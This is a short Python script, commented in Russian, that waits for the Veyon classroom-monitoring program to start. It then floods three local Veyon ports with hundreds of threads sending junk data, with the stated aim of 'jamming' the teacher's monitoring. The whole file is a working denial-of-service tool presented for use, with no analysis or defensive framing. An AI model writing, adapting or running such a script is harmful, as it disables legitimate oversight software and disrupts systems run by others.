import socket
import threading
import time
import psutil

TARGET = "127.0.0.1"
PORTS = [11100, 11400, 11200] # Основные порты Veyon
THREADS = 500
STOP = False

def flood(port):
    while not STOP:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((TARGET, port))
            s.send(b"\x00" * 1024) # Шлем мусор
            s.close()
        except Exception:
            pass
        time.sleep(0.01)

def check_veyon():
    for proc in psutil.process_iter(['name']):
        try:
            if 'veyon' in proc.info['name'].lower():
                return True
        except Exception:
            pass
    return False

def main():
    global STOP
    print("[*] Ждем запуска Veyon...")
    
    # Ждем, пока препод не запустит Veyon (или пока он не появится в процессах)
    while not check_veyon():
        time.sleep(1)
        
    print("[*] Veyon обнаружен. Начинаем глушить порты.")
    
    threads = []
    for port in PORTS:
        for _ in range(THREADS):
            t = threading.Thread(target=flood, args=(port,), daemon=True)
            t.start()
            threads.append(t)
            
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()